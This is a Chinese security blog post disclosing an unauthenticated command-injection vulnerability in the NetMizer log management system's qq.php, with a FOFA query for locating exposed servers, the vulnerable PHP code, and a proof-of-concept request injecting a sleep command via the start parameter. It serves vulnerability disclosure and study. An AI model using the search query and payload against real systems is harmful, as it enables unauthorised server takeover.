---
title: "NetMizer日志管理系统 qq.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-qq-start-rce.html
asset_dir: assets/netmizer日志管理系统-qq.php-命令执行漏洞
---

# NetMizer日志管理系统 qq.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/18 08:30
* 835浏览
* [0评论](#comment)
* 20分钟阅读

深入探索

Web服务器

鉴权

应用程序


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/qq.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

短信和即时消息

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

深入探索

授权

技术文章订阅

物流软件安全

看下 `qq.php` 业务实现关键逻辑部分

```
<?php
        include('../include/JSON.php');

        $cmd = "/var/www/cgi-bin/search_qq";

        list($year,$month,$day,$hour,$min,$second)=split(":| |-", $starttime);
        $start_time = mktime($hour, $min, $second, $month,$day,$year);
        $cmd .= " -s $start_time";
        list($year,$month,$day,$hour,$min,$second)=split(":| |-", $stoptime);
        $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
        $cmd .= " -e $stop_time";

        if($nodeid != ""){
                $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
                $cmd .= " -n $nodeid";
        } else        $sql_nodeid = "";

        $srcip = $src;
        if($srcip == ""){
                $srcid = "-1";
        } else $srcid = ip2long($srcip); 
        if($srcid != "-1"){
                $sql_srcid = " and src_addr = $srcid ";
                $cmd .= " -S $srcid";
        } else {
                $sql_srcid = "";
        }

        $user = $username;
        if($user != ""){
                $sql_user = " and user_name = \"$user\" ";
                $cmd .= " -u $user";
        } else {
                $sql_user = "";
        }

        if($qq != ""){
                $sql_qq = " and from_num = $qq ";
                $cmd .= " -q $qq";
        } else {
                $sql_qq = "";
        }

        if(!isset($start)) $start = 0;
        $cmd .= " -f $start -t 100000";

        if($action == 'file'){
                //echo $cmd."\n";
                $fp = @popen($cmd,"r");
```

深入探索

Docker加速服务

安全研究工具

安全研究报告

用户可控参数直接拼接进系统命令字符串 `$cmd` 中，并通过 `popen($cmd, "r")` 执行。参数如 `$nodeid`、`$srcid`、`$user`、`$qq` 和 `$start` 来自用户输入，未经过任何过滤或转义。这些参数在命令构建过程中直接插入，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

漏洞预警服务

```
GET /data/search/qq.php?action=file&start=1;sleep+3+%23+ HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 qq.php 命令执行漏洞](images/img-001-313926f0305b.webp)](https://image.mrxn.net/910a589657f4434dbe89d301e4876450.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 qq.php 命令执行漏洞](https://mrxn.net/jswz/netmizer-search-qq-start-rce.html)  
文章链接：<https://mrxn.net/jswz/netmizer-search-qq-start-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKXElEQVR4AeycjXLcOAyD9+v7v/PdwgwkWqIdp/lZT6NOWFAASCuilbTNzf15PB7/fTb+G36918/293xn+lkPaxnd6z3Ouv1Cc2co31eEBvLssz7ucgJtIM/pPz4S1ScAPICyT+Wvnlf5zGU/xLOsHSGEz7UQa+CoZOPtFwLb57UJb7/BzL1J5eevPkfhOmEbiBYrXn8C00AgJg81Xtky9NozP8y+6i1yD+j+ymfOfuHIeS2UroDeV2sFnHOqV8h7FNB7wJxXddNAKtPifu4E1kB+7qwvPelbBqKr7Li0i78wwfGXAOjaldbeq/CK/zs93zKQ79zwv977WwYC8xuqt88BoXsthOBgRg9BPoe5jBC19gitQ2hev4eqddjrtdDcV+O3DOTx1bv8Rf3WQG427Gkguo5ncWX/ud5+iC8ZgKntb7/Ahq5p4jMxZ3xS7eMq54KP+l33GfQzj7DqPQ2kMi3u506gDQTiTYVreHWLEP3yW+LazMHsg+Dsh1gDpkoEtlsHNB3YuEY8E7jGPa3TB8y1NkFocA1dJ2wD0WLF609gDeT1M9jt4E/+svG3uTu63uuM0K+veejcWa399gghapU7IDj7hRCcPeLGgPBA/9HB6NEauk/rHO7/WVw3JJ/qDfJpIHD8Fmi/0HV4P1eNIr85WisqTrzDOszPqTRzrheag+ghbgx7hDD7xI/hHjD7ITi4hu4lnAYi8qbxK7b1B/ZTrD5r6J7xTbm6zn1dA70vRJ59zu33WgjhtyYUr1DugL1P+hgQHmCUtjWw/ZEZOm5C+g1mzXvImEpaCr123ZB2LPdI1kDuMYe2i2kg+XpBXKWKg9DgGrYnpiT3dZ7k9mXCnD0ZoT/fvoz2moPuHzV7hHDuO6u1Br0HRK7eDvu8Fk4DEbnidSfQBlJNy9uCmC70vzjZn9H+zDmH3sO+jBB65sbarEH47RFah9AAUw3lcwDbLWxiSuwRwuyDmUvlW6pax0Y8f/Na+FxOH20gk7KIl5zAGshLjv34oW0gMF9BXasx3ArCDx3ttecIoddA5FUthHbURzyEBzqKHwNCH3mt/eyM4h2ZP8rtPULXZR3mPbWBZOOvym/2ybaBeIIQUwPKrQLbN0L7M7oAwgOY2v0HyCav1tpfYdUj+4DdfiHWQLad5sDWA2asCiF8WYOZ896zrw0kkyt/3Qmsgbzu7Msnt4HAfKXKijcSwg8d36TdlycI3doRwrGvutpVH/sqhOifNfeA0ABTuy9RjSwSYPNmyc/InHMIP3S0JmwD0WLF60/g9Ee4EFPM2/T0K7QPog763+ytCV0L3SdeYS2jeAXMfrjGuR90v7mMeo7iPc66vFfC/gpz/boh+TRukK+B3GAIeQvTQKBfaRvhGmd/vpbQa2Gf2/8eQtS957NePb/SzEH0B0zt0P0yCUzfzLM+5jD7YeamgYyN1vqvTuCviy4NxG+IEGKqyh0QnHcBsQZM7dB1O/JtAWxvHvDGXAeg1ULkroZYQ0drGaHrcJxf+RxyX+fQe5rLeGkguWDl33sC03914skLzx4N55N2rfqMUWnmMkI8I3Njnntby5zzSjOXcfRLqziIvVWaahQQHjj/47+8jnVDfBI3wTWQmwzC22gD8dWDa9fM/oxuWnHQ+8KcuzZj7qM8a86h95JHAZ2DyMUrINbQ0b0yyuuA8HqdEUI7qrUXwue1EGauDSQ3XPnrTqD9WxbM04Lg8vYgOPgY5h5VrjdmjMpnbvRqDbEn5Q774Viz5wjHXvLBvp84B4TmtbDqYQ7CDzzWDXnc69cayL3m8Wh/D/H1yftzDv1K2XcV3SNjVQvxjOyDPZfrIDTomGudu8brjJUG0S/7nENogKn2LwONOEiAzXsgN3rdkHYU90jaN/VqO9UbZB/ExGFGe4RnPaQ77IPez5w90DVz9gjNZYSoka6AWAPZ1nJ5FI14JsD0dsujeMof+oDoBZR164aUx/I6cg3kdWdfPrl9Uy/VN1JX0wFs19dr4ZutBAh/FiE46Ghd/RzQdej/QGdd6Dqh1grodVorpCuUO7RWeC3UegzxisxDPEO8ImtaKypOvAOiR/atG5JP4wb56Tf1an/jdIFmqzRzFbbCZwJsNw86Puntw7XbYvgNuh8izxbYcxBr6Hjmz5r3Icz8mEP0zjzMnPoosm/dkHwaN8ingUBMEs5Rk3Vc+Txg7nelTh74WK33JVR9DnFjQO9vLddA1yHyypdrruQQvbJ3GkgWvydfXc9OYA3k7HReoLWBQFwfX8WM1b4g/ECTge0bc66F4JrpmWR9zJ/y9GHPJPwFAbEf6JjbQOch8o8+336IeqA9AtjOCPof45v4TNpAnvn6uMEJTAOBPkGI3BMXes/KjwKiDvpbkL3uUWH2OYfo91E/9Oe71j2F5iqU7qh0iD1BoL1CmDn3kO6A2TcNxIULX3MCayCvOffDp7aB+BplrKqsQ1w36Gi/PUJzMPtg5uwXQujKrwSEX891XKmzV3jml+4YfRDPhvnLpLxHddKg17aBSFjx+hM4HYinCn2C3rK1jBA+e4QQXOXLnLxjZH3MIfrmGnsyB+GDGSt/rh1z6D2sVT0gfPYIITjoKH6M04GM5juv/5W9rYHcbJLtB1TQrxJEXu0VQoMZfX2ha2dc7g+9Buo8+6sc5jo//8x/pkHveebzc4SVT/xRZP+6Ifk0bpC3H1BV0/P+slZx1iut4iDeOmtH6L7G7DMH0QvqP266xn6vheag9xCvsCbU+iikK6D30FoBnYPIcx8ITl7HuiH5hG6Qr4HcYAh5C5e+qUNcLaDVAu2fkeH9vBUeJL6yWYboaw5iDZjaIbDtKZOw5/wcoX3Kx7CWMXvMw76/eJg58WO4H4QfeKwb8rjXrw9/U/dUK/SnljVzFUJ/MyDyXOscZg2Cq/p+lIPoBTV6H1VfaxVmv/XMVfm6IdWpNO7nk9PvIVC/MbDnx21D10ftaF29QRB9Ks1cRveuOGsQPQFTO3TtjrywALbvX8AF97Fl3ZDjs3mJsgbykmM/fmgbiK/qVTxu+dj9L/7cL/vNZbQOTFcfOgf73HVC91PuGDmvhaNHHER/5Q77IDTAVEN7hY1MCbB9Xokq0zaQUl3kj5/ANBCISUKNZzvU26GAXlv5IfSsQXCqd1j3OqO1CiF6AU0GtjcUOjaxSKD7IPLCNvWE8AKVveTy5zUNpKxY5I+dwBrIjx31tQf92ECAdr19Rd/b4uiD3uOs1nXC0SfOYQ3O+45+1wmtZRR/FNCfBXP+YwM52uBv5M8+5y8dCMTE8wMhuPwGQXDZZz1zV3KIXtAx10Hw7g+xBrKt5fY14pkA2+1+ptMHzFrVo+KmZk/iSwfy7Lc+PnkCayCfPMCvLp8G4qt1hGcbcM2ZR1rlg/nqw8ypPod7Cc1D1AGmGsrnMOm1ENi+PCk/i7EWog6wtPsXC+BS32kgrdtKXnICbSAQE4RreLbb/GbZB+d9K585Y9XXmjDrYw7z81XzkYDew3UQXH7eqMH5fxED0QNYP8J93OxXuyE329ev3c7/AAAA///4V4kuAAAABklEQVQDACJkspWlEcTWAAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-qq-start-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-qq-start-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 